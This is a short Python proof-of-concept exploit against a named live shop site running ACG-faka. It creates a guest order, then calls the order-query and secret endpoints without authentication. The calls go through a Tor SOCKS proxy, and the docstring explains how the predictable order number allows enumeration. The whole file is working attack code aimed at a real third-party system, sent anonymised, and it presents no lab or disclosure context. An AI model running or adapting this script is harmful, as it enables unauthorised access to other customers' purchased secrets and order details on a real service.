#!/usr/bin/env python3
"""PoC: hao998.xyz ACG-faka unauth order query + secret IDOR.

tradeNo format (upstream): mt_rand(100,999) + ymdHis + mt_rand(100,999)  # 18 digits
- POST /user/api/index/query  keywords=<tradeNo|contact>  → order (+ secret if paid & no query password)
- POST /user/api/index/secret orderId=<tradeNo>&password=  → secret if paid (password if set)
"""
import json
import subprocess
import sys

B = "https://hao998.xyz"
UA = "Mozilla/5.0"
PX = "socks5h://127.0.0.1:9050"


def curl(url, data):
    cmd = [
        "curl", "-sS", "-m", "20", "-x", PX, "-A", UA, "-k",
        "-H", f"Origin: {B}", "-H", f"Referer: {B}/",
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "--data", data, url,
    ]
    return subprocess.run(cmd, capture_output=True, text=True, timeout=30).stdout


def main():
    contact = sys.argv[1] if len(sys.argv) > 1 else None
    # 1) guest unpaid trade (wechat/xunhupay)
    if not contact:
        contact = "poc@example.com"
    body = curl(
        B + "/user/api/order/trade",
        f"commodity_id=11&num=1&pay_id=3&device=0&password=&coupon=&race=&from=0&contact={contact}",
    )
    print("TRADE", body)
    trade = json.loads(body)
    tn = trade["data"]["tradeNo"]
    print("tradeNo", tn)

    print("QUERY", curl(B + "/user/api/index/query", f"keywords={tn}"))
    print("SECRET", curl(B + "/user/api/index/secret", f"orderId={tn}&password="))
    # expected unpaid: 该订单还未支付 — proves tradeNo binding on secret


if __name__ == "__main__":
    main()
